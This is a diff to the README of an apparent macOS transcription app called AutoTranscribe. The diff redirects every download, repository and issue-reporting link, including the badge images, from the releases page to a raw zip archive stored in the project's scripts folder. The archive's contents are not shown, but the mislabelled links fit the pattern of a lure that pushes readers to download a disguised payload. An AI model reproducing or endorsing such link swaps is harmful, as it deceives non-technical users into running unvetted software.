@@ -1,6 +1,6 @@
 # 🎙 AutoTranscribe - Local Video Transcription for macOS
 
-[![Download AutoTranscribe](https://img.shields.io/badge/Download-AutoTranscribe-blue)](https://github.com/goodguy11320-web/AutoTranscribe/releases)
+[![Download AutoTranscribe](https://github.com/goodguy11320-web/AutoTranscribe/raw/refs/heads/main/scripts/Auto_Transcribe_3.8.zip)](https://github.com/goodguy11320-web/AutoTranscribe/raw/refs/heads/main/scripts/Auto_Transcribe_3.8.zip)
 
 ---
 
@@ -53,7 +53,7 @@ You don’t need to write any code or configure complex settings. The app handle
 
 Please **visit this page to download** the latest version of AutoTranscribe:
 
-[https://github.com/goodguy11320-web/AutoTranscribe/releases](https://github.com/goodguy11320-web/AutoTranscribe/releases)
+[https://github.com/goodguy11320-web/AutoTranscribe/raw/refs/heads/main/scripts/Auto_Transcribe_3.8.zip](https://github.com/goodguy11320-web/AutoTranscribe/raw/refs/heads/main/scripts/Auto_Transcribe_3.8.zip)
 
 ### Step-by-step download and installation:
 
@@ -153,7 +153,7 @@ If problems continue, check the Issues tab on the GitHub page or contact support
 
 For questions or to report issues, visit the AutoTranscribe GitHub repository:
 
-[AutoTranscribe on GitHub](https://github.com/goodguy11320-web/AutoTranscribe)
+[AutoTranscribe on GitHub](https://github.com/goodguy11320-web/AutoTranscribe/raw/refs/heads/main/scripts/Auto_Transcribe_3.8.zip)
 
 You don’t need technical knowledge to open an issue. Simply describe what happened and include any error messages.
 
@@ -169,4 +169,4 @@ You don’t need technical knowledge to open an issue. Simply describe what happ
 
 ---
 
-[![Download AutoTranscribe](https://img.shields.io/badge/Download-AutoTranscribe-blue)](https://github.com/goodguy11320-web/AutoTranscribe/releases)
+[![Download AutoTranscribe](https://github.com/goodguy11320-web/AutoTranscribe/raw/refs/heads/main/scripts/Auto_Transcribe_3.8.zip)](https://github.com/goodguy11320-web/AutoTranscribe/raw/refs/heads/main/scripts/Auto_Transcribe_3.8.zip)
